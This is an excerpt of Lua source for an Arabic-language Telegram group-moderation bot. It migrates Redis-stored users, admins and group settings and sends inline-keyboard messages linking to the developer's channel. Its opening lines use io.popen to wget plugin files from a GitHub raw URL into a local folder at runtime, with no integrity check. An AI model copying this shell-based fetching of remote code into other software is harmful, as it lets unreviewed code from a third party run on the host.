io.popen("cd Files && wget https://raw.githubusercontent.com/AntakTeam/AntakFiles/main/AntakFiles/ChangeUser.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/AntakTeam/AntakFiles/main/AntakFiles/MuteNames.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/AntakTeam/AntakFiles/main/AntakFiles/ProNames.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/AntakTeam/AntakFiles/main/AntakFiles/ReplyBot.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/AntakTeam/AntakFiles/main/AntakFiles/TagAdmins.lua") 
io.popen("cd Files && wget https://raw.githubusercontent.com/AntakTeam/AntakFiles/main/AntakFiles/TagAll.lua") 
...
local Users = DevAbs:smembers(Antak.."User_Bot")
...
local id = Users[i]
if id:match("^(%d+)") then
DevAbs:sadd(Antak..'Abs:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevAbs:sadd(Antak..'Abs:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevAbs:sadd(Antak..'Abs:Groups',Groups[i]) 
if DevAbs:get(Antak.."Private:Group:Link"..Groups[i]) then
DevAbs:set(Antak.."Abs:Groups:Links"..Groups[i],DevAbs:get(Antak.."Private:Group:Link"..Groups[i]))
end
if DevAbs:get(Antak.."Get:Welcome:Group"..Groups[i]) then
DevAbs:set(Antak..'Abs:Groups:Welcomes'..Groups[i],DevAbs:get(Antak.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevAbs:smembers(Antak..'Constructor'..Groups[i])
for k,v in pairs(list2) do
DevAbs:sadd(Antak.."Abs:Constructor:"..Groups[i], v)
end
local list3 = DevAbs:smembers(Antak..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevAbs:sadd(Antak.."Abs:BasicConstructor:"..Groups[i], v)
end
local list4 = DevAbs:smembers(Antak..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevAbs:sadd(Antak.."Abs:Managers:"..Groups[i], v)
end
local list5 = DevAbs:smembers(Antak..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevAbs:sadd(Antak.."Abs:Admins:"..Groups[i], v)
end
local list6 = DevAbs:smembers(Antak..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevAbs:sadd(Antak.."Abs:VipMem:"..Groups[i], v)
end
DevAbs:set(Antak.."Abs:Lock:Bots"..Groups[i],"del") DevAbs:hset(Antak.."Abs:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
...
for i,Lock in pairs(LockList) do
DevAbs:set(Antak..Lock..Groups[i],true)
end
end
...
Text = [[
✯︙[قناة السورس](https://t.me/BAANDDE)
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
Text = [[
✯︙[مبرمج السورس](https://t.me/D9l9l)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✯ مبرمج السورس',url="t.me/D9l9l"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/D9l9l&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
...
if DevAbs:get(Antak..'Abs:Lock:EditMsgs'..msg.chat_id_) and not Text and not AbsConstructor(result) then
